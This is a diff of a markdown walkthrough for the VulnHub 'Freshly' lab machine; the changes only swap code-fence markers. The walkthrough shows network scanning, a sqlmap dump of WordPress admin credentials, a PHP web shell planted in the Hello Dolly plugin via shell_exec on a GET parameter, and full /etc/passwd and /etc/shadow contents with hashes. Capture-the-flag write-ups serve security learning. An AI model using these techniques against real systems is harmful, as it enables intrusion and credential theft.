@@ -10,17 +10,17 @@ This is my solution for VulnHub's [Freshly](https://www.vulnhub.com/entry/tophat
 
 I started by finding the host's IP address in my local network.
 
-```
+~~~
 $ arp -v
 
 Address                  HWtype  HWaddress           Flags Mask            Iface
 192.168.0.104            ether   08:00:27:f2:73:82   C                     wlan0
 192.168.0.1              ether   c0:4a:00:65:77:d6   C                     wlan0
-```
+~~~
 
 Now I know its IP address is 192.168.0.104. Then, I proceed to checking the services running there.
 
-```
+~~~
 $ sudo nmap -Pn 192.168.0.104
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2015-11-28 17:13 WIB
@@ -32,13 +32,13 @@ PORT     STATE SERVICE
 443/tcp  open  https
 8080/tcp open  http-proxy
 MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
-```
+~~~
 
 For more details on the service, you can run this.
 
-```
+~~~
 $ sudo nmap -T5 -A -v 192.168.0.104 -p 0-6553
-```
+~~~
 
 Only those three is going to get any results from this brutal scanning though.
 
@@ -104,9 +104,9 @@ It respond with `1` instead of `0` as when I tried random username and password 
 
 For the next part, from 192.168.0.104:8080/wordpress on `/wp-content/plugins/hello.php` returned this.
 
-```
+~~~
 Fatal error: Call to undefined function add_action() in /opt/wordpress-4.1-0/apps/wordpress/htdocs/wp-content/plugins/hello.php on line 60
-```
+~~~
 
 After some googling on this `hello.php` file on WordPress, I found out that it belongs to a plugin called Hello Dolly.
 
@@ -114,7 +114,7 @@ After some googling on this `hello.php` file on WordPress, I found out that it b
 
 For `/login.php`, I'm using sqlmap to exploit the SQL injection vulnerability. Since it's a POST request and it's a bit bothersome to manually craft a POST request in sqlmap, I use Burp Suite to interrupt the POST request and put the content in a file called `request.txt`.
 
-```
+~~~
 POST /login.php HTTP/1.1
 Host: 192.168.0.104
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
@@ -127,17 +127,17 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 30
 
 user=testing&password=testing&s=Submit
-```
+~~~
 
 Then, I run sqlmap using this `request.txt` file as the request content.
 
-```
+~~~
 $ ./sqlmap.py -r request.txt --dbs
-```
+~~~
 
 It returned the list of databases in the system.
 
-```
+~~~
 available databases [7]:
 [*] information_schema
 [*] login
@@ -146,36 +146,36 @@ available databases [7]:
 [*] phpmyadmin
 [*] users
 [*] wordpress8080
-```
+~~~
 
 Let's try checking out the `wordpress8080` database's tables.
 
-```
+~~~
 $ ./sqlmap.py -r request.txt -D wordpress8080 --tables
-```
+~~~
 
 It only have `users` table.
 
-```
+~~~
 Database: wordpress8080
 [1 table]
 +-------+
 | users |
 +-------+
-```
+~~~
 
 Well, let's see what's inside the table.
 
-```
+~~~
 $ ./sqlmap.py -r request.txt -D wordpress8080 -T users --dump
-```
+~~~
 
 The table only has one record.
 
-```
+~~~
 username,password
 admin,SuperSecretPassword
-```
+~~~
 
 We can use that to log in to the WordPress site.
 
@@ -189,7 +189,7 @@ The Hello Dolly plugin will show a random line from a Louis Armstrong's song [He
 
 We can modify what it prints by editing the plugin. Change the content of `hello_dolly_get_lyric()` with the following.
 
-```php
+~~~php
 function hello_dolly_get_lyric() {
   /** These are the lyrics to Hello Dolly */
   $lyrics = "Hello, Dolly
@@ -229,13 +229,13 @@ Dolly'll never go away again";
   $lyrics = "<pre>".shell_exec($_GET['cmd'])."</pre>";
   return  wptexturize($lyrics);
 }
-```
+~~~
 
 See that I commented the return value, change the `$lyrics` variable to print the execution result of shell commands we put in `cmd` GET parameter and put it on the page. Try the following GET request.
 
-```
+~~~
 http://192.168.0.104:8080/wordpress/wp-admin/index.php?cmd=ls%20-l
-```
+~~~
 
 This is what we're going to get.
 
@@ -251,7 +251,7 @@ And also `/etc/shadow` (which is not usually readable unless for root).
 
 Notice the last two lines in both files.
 
-```
+~~~
 /etc/passwd
 # YOU STOLE MY SECRET FILE!
 # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
@@ -259,13 +259,13 @@ Notice the last two lines in both files.
 /etc/shadow
 # YOU STOLE MY PASSWORD FILE!
 # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
-```
+~~~
 
 I wasn't really sure if it's the flag that have to be captured in this challenge, so I checked other walkthrough to see what is the flag file that needs to be captured (since it's not mentioned in the challenge's goal). But seems like it really is the flag.
 
 Here's the full content of the files for `/etc/passwd`.
 
-```
+~~~
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -292,11 +292,11 @@ mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
 candycane:x:1001:1001::/home/candycane:
 # YOU STOLE MY SECRET FILE!
 # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
-```
+~~~
 
 And this one is for `/etc/shadow`.
 
-```
+~~~
 root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
 daemon:*:16483:0:99999:7:::
 bin:*:16483:0:99999:7:::
@@ -323,4 +323,4 @@ mysql:!:16483:0:99999:7:::
 candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
 # YOU STOLE MY PASSWORD FILE!
 # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
-```
+~~~
